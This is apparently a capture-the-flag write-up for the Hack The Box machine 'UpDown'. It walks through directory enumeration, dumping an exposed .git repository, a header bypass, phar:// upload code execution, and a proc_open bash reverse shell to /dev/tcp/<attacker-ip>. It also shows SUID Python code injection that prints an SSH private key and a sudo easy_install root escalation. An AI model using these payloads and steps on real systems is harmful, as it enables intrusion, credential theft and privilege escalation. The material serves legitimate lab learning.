# UpDown

<figure><img src="../../.gitbook/assets/UpDown.png" alt=""><figcaption></figcaption></figure>

UpDown is a medium difficulty Linux machine with SSH and Apache servers exposed. On the Apache server a web application is featured that allows users to check if a webpage is up. A directory named `.git` is identified on the server and can be downloaded to reveal the source code of the `dev` subdomain running on the target, which can only be accessed with a special `HTTP` header. Furthermore, the subdomain allows files to be uploaded, leading to remote code execution using the `phar://` PHP wrapper. The Pivot consists of injecting code into a `SUID` `Python` script and obtaining a shell as the `developer` user, who may run `easy_install` with `Sudo`, without a password. This can be leveraged by creating a malicious python script and running `easy_install` on it, as the elevated privileges are not dropped, allowing us to maintain access as `root`.

ip address : 10.10.11.177

lets start with nmap

```
nmap -A 10.10.11.177
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-15 09:08 +03
Stats: 0:00:23 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 99.90% done; ETC: 09:08 (0:00:00 remaining)
Stats: 0:00:33 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.95% done; ETC: 09:08 (0:00:00 remaining)
Nmap scan report for 10.10.11.177
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.11 seconds
```

on main page we tested the website allow traffic out of node itself

<figure><img src="../../.gitbook/assets/1 (2).png" alt=""><figcaption><p>small server on 80 port</p></figcaption></figure>

next lets try find what is next find hidden subdomains

```
gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.177/
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.177/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/dev                  (Status: 301) [Size: 310] [--> http://10.10.11.177/dev/]
```

its empty page

<figure><img src="../../.gitbook/assets/2 (2).png" alt=""><figcaption><p>dev dir </p></figcaption></figure>

so lets try find anther subdomains in under dev

```
cybersoldier@parrot]─[~]
└──╼ $gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.11.177/dev
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.177/dev
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.git                 (Status: 301) [Size: 315] [--> http://10.10.11.177/dev/.git/]
/.git/HEAD            (Status: 200) [Size: 21]
/.git/index           (Status: 200) [Size: 521]
/.git/logs/           (Status: 200) [Size: 1143]
/.git/config          (Status: 200) [Size: 298]
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
Progress: 583 / 4730 (12.33%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 591 / 4730 (12.49%)
===============================================================
Finished
===============================================================

```

its looks we can found .git folder lets try the following

<figure><img src="../../.gitbook/assets/3 (2).png" alt=""><figcaption><p>.git dir</p></figcaption></figure>

**GitTools**:

> GitTools is a collection of Python scripts designed to download and extract a git repository from a website.

```
git clone https://github.com/internetwache/GitTools.git
cd GitTools
```

> **Dumper**: To download the `.git` folder.

```
cd Dumper
./gitdumper.sh http://target.com/.git/ /path/to/download/
```

```
cybersoldier@parrot]─[~/Desktop/updown]
└──╼ $../tools/GitTools/Dumper/gitdumper.sh http://10.10.11.177/dev/.git/ .
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating ./.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[-] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[+] Downloaded: packed-refs
[-] Downloaded: refs/heads/master
[+] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[-] Downloaded: logs/refs/heads/master
[+] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[-] Downloaded: objects/01/0dcc30cc1e89344e2bdbd3064f61c772d89a34
[-] Downloaded: objects/00/00000000000000000000000000000000000000
```

> **Extractor**: To extract the downloaded repository and reconstruct the directory structure.

```
cd ../Extractor
./extractor.sh /path/to/download/.git /path/to/extracted/
```

I found interesting files in the /dev/.git/objects/pack

<figure><img src="../../.gitbook/assets/4 (2).png" alt=""><figcaption></figcaption></figure>

lets downloaded all

I found anther tool anther that unpacks all in .git dir lets use it

```
./git_dumper.py  http://10.10.11.177/dev/.git/ ../../updown/
Warning: Destination '../../updown/' is not empty
[-] Testing http://10.10.11.177/dev/.git/HEAD [200]
[-] Testing http://10.10.11.177/dev/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://10.10.11.177/dev/.git/ [200]
[-] Fetching http://10.10.11.177/dev/.gitignore [404]
[-] http://10.10.11.177/dev/.gitignore responded with status code 404
[-] Fetching http://10.10.11.177/dev/.git/objects/ [200]
[-] Fetching http://10.10.11.177/dev/.git/description [200]
[-] Fetching http://10.10.11.177/dev/.git/logs/ [200]
[-] Fetching http://10.10.11.177/dev/.git/hooks/ [200]
[-] Fetching http://10.10.11.177/dev/.git/HEAD [200]
[-] Fetching http://10.10.11.177/dev/.git/info/ [200]
[-] Fetching http://10.10.11.177/dev/.git/index [200]
[-] Fetching http://10.10.11.177/dev/.git/branches/ [200]
[-] Fetching http://10.10.11.177/dev/.git/config [200]
[-] Fetching http://10.10.11.177/dev/.git/refs/ [200]
[-] Fetching http://10.10.11.177/dev/.git/objects/info/ [200]
[-] Fetching http://10.10.11.177/dev/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://10.10.11.177/dev/.git/objects/pack/ [200]
[-] Fetching http://10.10.11.177/dev/.git/logs/HEAD [200]
[-] Fetching http://10.10.11.177/dev/.git/logs/refs/ [200]
[-] Fetching http://10.10.11.177/dev/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://10.10.11.177/dev/.git/info/exclude [200]
[-] Fetching http://10.10.11.177/dev/.git/hooks/commit-msg.sample [200]
[-] Fetching http://10.10.11.177/dev/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://10.10.11.177/dev/.git/hooks/post-update.sample [200]
[-] Fetching http://10.10.11.177/dev/.git/hooks/pre-commit.sample [200]
[-] Fetching http://10.10.11.177/dev/.git/hooks/pre-push.sample [200]
[-] Fetching http://10.10.11.177/dev/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://10.10.11.177/dev/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://10.10.11.177/dev/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://10.10.11.177/dev/.git/hooks/pre-receive.sample [200]
[-] Fetching http://10.10.11.177/dev/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://10.10.11.177/dev/.git/refs/heads/ [200]
[-] Fetching http://10.10.11.177/dev/.git/hooks/update.sample [200]
[-] Fetching http://10.10.11.177/dev/.git/refs/tags/ [200]
[-] Fetching http://10.10.11.177/dev/.git/refs/remotes/ [200]
[-] Fetching http://10.10.11.177/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.pack [200]
[-] Fetching http://10.10.11.177/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.idx [200]
[-] Fetching http://10.10.11.177/dev/.git/logs/refs/heads/ [200]
[-] Fetching http://10.10.11.177/dev/.git/logs/refs/remotes/ [200]
[-] Fetching http://10.10.11.177/dev/.git/packed-refs [200]
[-] Fetching http://10.10.11.177/dev/.git/refs/heads/main [200]
[-] Fetching http://10.10.11.177/dev/.git/refs/remotes/origin/ [200]
[-] Fetching http://10.10.11.177/dev/.git/logs/refs/heads/main [200]
[-] Fetching http://10.10.11.177/dev/.git/logs/refs/remotes/origin/ [200]
[-] Fetching http://10.10.11.177/dev/.git/refs/remotes/origin/HEAD [200]
[-] Fetching http://10.10.11.177/dev/.git/logs/refs/remotes/origin/HEAD [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 6 paths from the index
```

we found these

<figure><img src="../../.gitbook/assets/5 (2).png" alt=""><figcaption></figcaption></figure>

lets view and see



## admin.php:

```php
<?php
if(DIRECTACCESS){
	die("Access Denied");
}

#ToDo
?>
```

nothing interesting

## lets view changelog.txt :&#x20;

```
Beta version

1- Check a bunch of websites.

-- ToDo:

1- Multithreading for a faster version :D.
2- Remove the upload option.
3- New admin panel.

```

Se found admin panel and file-upload

## here is a checker.php

to check file-upload file

```php
<?php
if(DIRECTACCESS){
	die("Access Denied");
}
?>
<!DOCTYPE html>
<html>

  <head>
    <meta charset='utf-8' />
    <meta http-equiv="X-UA-Compatible" content="chrome=1" />
    <link rel="stylesheet" type="text/css" media="screen" href="stylesheet.css">
    <title>Is my Website up ? (beta version)</title>
  </head>

  <body>

    <div id="header_wrap" class="outer">
        <header class="inner">
          <h1 id="project_title">Welcome,<br> Is My Website UP ?</h1>
          <h2 id="project_tagline">In this version you are able to scan a list of websites !</h2>
        </header>
    </div>

    <div id="main_content_wrap" class="outer">
      <section id="main_content" class="inner">
        <form method="post" enctype="multipart/form-data">
			    <label>List of websites to check:</label><br><br>
				<input type="file" name="file" size="50">
				<input name="check" type="submit" value="Check">
		</form>

<?php

function isitup($url){
	$ch=curl_init();
	curl_setopt($ch, CURLOPT_URL, trim($url));
	curl_setopt($ch, CURLOPT_USERAGENT, "siteisup.htb beta");
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_TIMEOUT, 30);
	$f = curl_exec($ch);
	$header = curl_getinfo($ch);
	if($f AND $header['http_code'] == 200){
		return array(true,$f);
	}else{
		return false;
	}
    curl_close($ch);
}

if($_POST['check']){
  
	# File size must be less than 10kb.
	if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
	$file = $_FILES['file']['name'];
	
	# Check if extension is allowed.
	$ext = getExtension($file);
	if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
		die("Extension not allowed!");
	}
  
	# Create directory to upload our file.
	$dir = "uploads/".md5(time())."/";
	if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
  
  # Upload the file.
	$final_path = $dir.$file;
	move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
	
  # Read the uploaded file.
	$websites = explode("\n",file_get_contents($final_path));
	
	foreach($websites as $site){
		$site=trim($site);
		if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
			$check=isitup($site);
			if($check){
				echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
			}else{
				echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
			}	
		}else{
			echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
		}
	}
	
  # Delete the uploaded file.
	@unlink($final_path);
}

function getExtension($file) {
	$extension = strrpos($file,".");
	return ($extension===false) ? "" : substr($file,$extension+1);
}
?>
      </section>
    </div>

    <div id="footer_wrap" class="outer">
      <footer class="inner">
        <p class="copyright">siteisup.htb (beta)</p><br>
        <a class="changelog" href="changelog.txt">changelog.txt</a><br>
      </footer>
    </div>

  </body>
</html>
```

## and here is index.php

```php
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<?php
	define("DIRECTACCESS",false);
	$page=$_GET['page'];
	if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
		include($_GET['page'] . ".php");
	}else{
		include("checker.php");
	}	
?>
```

when use ls -la in same folder we found these

```
cybersoldier@parrot]─[~/Desktop/updown]
└──╼ $ls -la
total 56
drwxr-xr-x 1 cybersoldier cybersoldier   356 Jun 15 15:08 .
drwxr-xr-x 1 cybersoldier cybersoldier   574 Jun 15 15:22 ..
-rw-r--r-- 1 cybersoldier cybersoldier    59 Jun 15 15:08 admin.php
-rw-r--r-- 1 cybersoldier cybersoldier   147 Jun 15 15:08 changelog.txt
-rw-r--r-- 1 cybersoldier cybersoldier  3145 Jun 15 15:08 checker.php
drwxr-xr-x 1 cybersoldier cybersoldier   122 Jun 15 15:08 .git
-rw-r--r-- 1 cybersoldier cybersoldier   117 Jun 15 15:08 .htaccess
-rw-r--r-- 1 cybersoldier cybersoldier  2884 Jun 15 12:26 index.html
-rw-r--r-- 1 cybersoldier cybersoldier   273 Jun 15 15:08 index.php
-rw-r--r-- 1 cybersoldier cybersoldier  2444 Jun 15 13:05 pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.idx
-rw-r--r-- 1 cybersoldier cybersoldier 14332 Jun 15 13:06 pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.pack
-rw-r--r-- 1 cybersoldier cybersoldier  5531 Jun 15 15:08 stylesheet.css

```

lets read .htacess

```
cat .htaccess
```

```php
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Heade
```

This configuration restricts access to a resource by default (deny all), but allows access if a specific request header (`Special-Dev`) contains a specific value (`only4dev`)

here to see all requests with special header

add to burp suite

```
Proxy” → “Options” → “Match and Replace” → “Add” and add “Special-Dev: only4dev
```

<figure><img src="../../.gitbook/assets/6 (1) (1).png" alt=""><figcaption></figcaption></figure>

**lets see if there is where dev doamin**

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://siteisup.htb/ -H "Host: FUZZ.siteisup.htb"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://siteisup.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.siteisup.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [2/114441] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erro:: Progress: [40/114441] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errpop                     [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 102ms]
:: Progress: [40/114441] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errwww                     [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 102ms]
:: Progress: [41/114441] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errwebdisk                 [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 103ms]
:: Progress: [42/114441] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errcpanel                  [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 103ms]
:: Progress: [43/114441] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errmail                    [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 103ms]
```

**here lets filter by -fs 1131**

```
cybersoldier@parrot]─[~]
└──╼ $ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://siteisup.htb/ -H "Host: FUZZ.siteisup.htb" -fs 1131

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://siteisup.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.siteisup.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1131
________________________________________________

dev                     [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 4542ms]
```

**lets added to /etc/hosts**

[**http://dev.siteisup.htb/**](http://dev.siteisup.htb/) **page**

<figure><img src="../../.gitbook/assets/7 (1) (1).png" alt=""><figcaption><p>Don`t Forget the special header</p></figcaption></figure>

**so lets review the**

**checker.php extension**

```php
if($_POST['check']){

# File size must be less than 10kb.
if ($_FILES['file']['size'] > 10000) {
die("File too large!");
}
$file = $_FILES['file']['name'];

# Check if extension is allowed.
$ext = getExtension($file);
if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
die("Extension not allowed!");
}

# Create directory to upload our file.
$dir = "uploads/".md5(time())."/";
if(!is_dir($dir)){
mkdir($dir, 0770, true);
}
```

**here as we see can make file-upload with html,py,pl,zip,rar,gz,gzip,tar,etc..**

**and if we review index.php**

```php
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<?php
define("DIRECTACCESS",false);
$page=$_GET['page'];
if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
include($_GET['page'] . ".php");
}else{
include("checker.php");
}
?>
```

**same thing but bin,usr,home,etc..**

**in the checker.php**

```php
# Upload the file.
$final_path = $dir.$file;
move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");

# Read the uploaded file.
$websites = explode("\n",file_get_contents($final_path));

foreach($websites as $site){
$site=trim($site);
if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
$check=isitup($site);
if($check){
echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
}else{
echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
}
}else{
echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
}
}

# Delete the uploaded file.
@unlink($final_path);
}
```

**we can use file:// or** [**data://**](data://) **or ftp://**

**so lets now make bypass all these by folowing steps**

**1- create test.php**

**that contain this code**

```php
<?php phpinfo(); ?>
```

**2- we can zip extension so lets make jpg format with zip with previous test.php**

```
zip test.0xcybersoldier test.php
```

**3- test file**

<figure><img src="../../.gitbook/assets/8 (1).png" alt=""><figcaption></figcaption></figure>

**now as we see its cannot execute because we php or phar with these**

**but php is disabled so will try with phar://**

```
phar://[archive path]/[file inside the archive]
```

and we know that there page parameter in index.php

```php
include($_GET['page'] . ".php");
```

**or**

**we see in admin panel**

<figure><img src="../../.gitbook/assets/9 (1).png" alt=""><figcaption></figcaption></figure>

**lets upload our file to test by page parameter in phar://**

**results :**

<figure><img src="../../.gitbook/assets/10 (1).png" alt=""><figcaption></figcaption></figure>

**we notice that disabled functions**

\


| disable\_functions | pcntl\_alarm,pcntl\_fork,pcntl\_waitpid,pcntl\_wait,pcntl\_wifexited,pcntl\_wifstopped,pcntl\_wifsignaled,pcntl\_wifcontinued,pcntl\_wexitstatus,pcntl\_wtermsig,pcntl\_wstopsig,pcntl\_signal,pcntl\_signal\_get\_handler,pcntl\_signal\_dispatch,pcntl\_get\_last\_error,pcntl\_strerror,pcntl\_sigprocmask,pcntl\_sigwaitinfo,pcntl\_sigtimedwait,pcntl\_exec,pcntl\_getpriority,pcntl\_setpriority,pcntl\_async\_signals,pcntl\_unshare,error\_log,system,exec,shell\_exec,popen,passthru,link,symlink,syslog,ld,mail,stream\_socket\_sendto,dl,stream\_socket\_client,fsockopen |
| ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |

**These functions won’t work, and include most of the ones necessary to get execution. However, I could notice that** `proc_open` **isn’t listed**

**so lets use tool called dfunc-bypasser.py that bypass disabled function bypasser**

based on documentation on php [https://www.php.net/manual/en/function.proc-open.php](https://www.php.net/manual/en/function.proc-open.php)\
proc\_open

(PHP 4 >= 4.3.0, PHP 5, PHP 7, PHP 8)

proc\_open — Execute a command and open file pointers for input/output

so lets proc\_open reverse shell

here already in github

{% embed url="https://gist.github.com/noobpk/33e4318c7533f32d6a7ce096bc0457b7" %}

lets edit all code to

```php
<?php $descspec = array( 0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w") ); $cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/<attacker-ip>/<attacker-port> 0>&1'"; $proc = proc_open($cmd, $descspec, $pipes);
```

by upload it and get reverse shell

<figure><img src="../../.gitbook/assets/11 (1).png" alt=""><figcaption></figcaption></figure>

if we try to read user.txt flag

```
www-data@updown:/home/developer$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```

I found something interesting in developer then in dev folder

```
www-data@updown:/home/developer/dev$ cat siteisup_test.py
cat siteisup_test.py
```

```python
url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
	print "Website is up"
else:
	print "Website is down”
```

read siteisup with sritngs :

```
www-data@updown:/home/developer/dev$ strings siteisup
strings siteisup
/lib64/ld-linux-x86-64.so.2
libc.so.6
puts
setresgid
setresuid
system
getegid
geteuid
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
Welcome to 'siteisup.htb' application
/usr/bin/python /home/developer/dev/siteisup_test.py
:*3$"
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8061
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
siteisup.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
setresuid@@GLIBC_2.2.5
_edata
setresgid@@GLIBC_2.2.5
system@@GLIBC_2.2.5
geteuid@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
getegid@@GLIBC_2.2.5
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment

```

here is waiting input to execute python

lets read ssh id\_rsa

```
www-data@updown:/home/developer/dev$ ./siteisup
./siteisup
__import__("subprocess").call(["cat","/home/developer/.ssh/id_rsa"])
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmvB40TWM8eu0n6FOzixTA1pQ39SpwYyrYCjKrDtp8g5E05EEcJw/
S1qi9PFoNvzkt7Uy3++6xDd95ugAdtuRL7qzA03xSNkqnt2HgjKAPOr6ctIvMDph8JeBF2
F9Sy4XrtfCP76+WpzmxT7utvGD0N1AY3+EGRpOb7q59X0pcPRnIUnxu2sN+vIXjfGvqiAY
ozOB5DeX8rb2bkii6S3Q1tM1VUDoW7cCRbnBMglm2FXEJU9lEv9Py2D4BavFvoUqtT8aCo
srrKvTpAQkPrvfioShtIpo95Gfyx6Bj2MKJ6QuhiJK+O2zYm0z2ujjCXuM3V4Jb0I1Ud+q
a+QtxTsNQVpcIuct06xTfVXeEtPThaLI5KkXElx+TgwR0633jwRpfx1eVgLCxxYk5CapHu
…<SNIP>…
Enter URL here:Traceback (most recent call last):
  File "/home/developer/dev/siteisup_test.py", line 4, in <module>
    page = requests.get(url)
  File "/usr/local/lib/python2.7/dist-packages/requests/api.py", line 75, in get
    return request('get', url, params=params, **kwargs)
  File "/usr/local/lib/python2.7/dist-packages/requests/api.py", line 61, in request
    return session.request(method=method, url=url, **kwargs)
  File "/usr/local/lib/python2.7/dist-packages/requests/sessions.py", line 515, in request
    prep = self.prepare_request(req)
  File "/usr/local/lib/python2.7/dist-packages/requests/sessions.py", line 453, in prepare_request
    hooks=merge_hooks(request.hooks, self.hooks),
  File "/usr/local/lib/python2.7/dist-packages/requests/models.py", line 318, in prepare
    self.prepare_url(url, params)
  File "/usr/local/lib/python2.7/dist-packages/requests/models.py", line 392, in prepare_url
    raise MissingSchema(error)
requests.exceptions.MissingSchema: Invalid URL '0': No scheme supplied. Perhaps you meant http://0?
Welcome to 'siteisup.htb' application
```

by

```
chmod 600 id_rsa
```

```
ssh -i id_rsa developer@10.10.11.177
```

```
developer@updown:~$ cat user.txt
```

checking sudoers files

```
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
```

in&#x20;

{% embed url="https://gtfobins.github.io/gtfobins/easy_install/" %}

<figure><img src="../../.gitbook/assets/12 (1).png" alt=""><figcaption></figcaption></figure>

lets do as it said and get root user and read root.txt flag

```
developer@updown:~$ TF=$(mktemp -d)
developer@updown:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
developer@updown:~$ sudo easy_install $TF
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing tmp.VIhcqcpyLg
Writing /tmp/tmp.VIhcqcpyLg/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.VIhcqcpyLg/egg-dist-tmp-OBPeCy
# whoami
root
# cat /root/root.txt
```

